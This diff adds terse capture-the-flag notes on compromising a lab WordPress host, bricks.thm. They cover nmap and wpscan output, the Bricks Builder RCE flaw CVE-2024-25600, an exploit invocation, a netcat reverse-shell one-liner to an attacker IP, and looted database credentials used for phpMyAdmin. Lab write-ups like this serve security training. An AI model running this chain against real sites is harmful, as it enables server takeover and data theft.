@@ -1,0 +1,140 @@
+# NMAP:
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e3:4e:bc:43:6e:8c:de:79:93:d9:4f:88:e3:d9:73:3c (RSA)
+|   256 a9:4d:08:09:1c:96:e1:a9:42:38:b8:5f:6d:cf:3a:98 (ECDSA)
+|_  256 84:20:e1:c9:1a:23:51:1a:ee:62:60:0a:c9:14:35:99 (ED25519)
+80/tcp   open  http     Python http.server 3.5 - 3.10
+|_http-server-header: WebSockify Python/3.8.10
+|_http-title: Error response
+443/tcp  open  ssl/http Apache httpd
+|_http-generator: WordPress 6.5
+| tls-alpn: 
+|   h2
+|_  http/1.1
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
+| Not valid before: 2024-04-02T11:59:14
+|_Not valid after:  2025-04-02T11:59:14
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-title: Brick by Brick
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache
+3306/tcp open  mysql    MySQL (unauthorized)
+
+# FINDS:
+https://bricks.thm/wp-json/
+
+Robots.txt:::
+
+User-agent: *
+Disallow: /wp-admin/
+Allow: /wp-admin/admin-ajax.php
+
+# WP SCAN::
+kali@kali:~/Downloads$ wpscan --url https://bricks.thm  -e ap 
+
+Scan Aborted: The url supplied 'https://bricks.thm/' seems to be down (SSL peer certificate or SSH remote key was not OK)
+
+SCAN 2: disable the TLS check:
+wpscan --url https://bricks.thm  -e ap --disable-tls-checks
+
+[+] Headers
+ | Interesting Entry: server: Apache
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: https://bricks.thm/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: https://bricks.thm/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
+ | Found By: Rss Generator (Passive Detection)
+ |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
+ |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>
+
+[+] WordPress theme in use: bricks
+ | Location: https://bricks.thm/wp-content/themes/bricks/
+ | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
+ | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
+ | Style Name: Bricks
+ | Style URI: https://bricksbuilder.io/
+ | Description: Visual website builder for WordPress....
+ | Author: Bricks
+ | Author URI: https://bricksbuilder.io/
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ | Confirmed By: Urls In 404 Page (Passive Detection)
+ |
+ | Version: 1.9.5 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+NEW FIND::
+from the wp scan we found that the version on one of the links is 1.9.5, simply googling we found the exploiut for it. 
+::- https://bricks.thm/wp-content/themes/bricks/style.css,  Match: 'Version: 1.9.5'
+CVE-2024-25600 - WordPress Bricks Builder Remote Code Execution (RCE) 🌐
+The Bricks theme for WordPress has been identified as vulnerable to a critical security flaw known as CVE-2024-25600. This vulnerability affects all versions up to, and including, 1.9.6 of the Bricks Builder plugin. It poses a significant risk as it allows unauthenticated attackers to execute arbitrary code remotely on the server hosting the vulnerable WordPress site. CVE-2024-25600 
+
+# SHELL
+WE FOUND THE CODE TO EXPLOIT THE VULNERABLILITY::
+python3 exploit.py -u https://bricks.thm
+RUN THE REVERSE SHELL ON THE SHELL WE GOT TO GET THE MORE STABLE SHELL:
+THE ONE THAT WORKED:
+## shell code
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.21.129.108 4444 >/tmp/f
+
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** Database username */
+define( 'DB_USER', 'root' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'lamp.sh' );
+
+/** Database hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+# 
+Go to https://bricks.thm/phpmyadmin/ 
+Enter the user name and the password we got :
+
+# OR
+We can use the metasploit tool and there we can search for the "bricks"
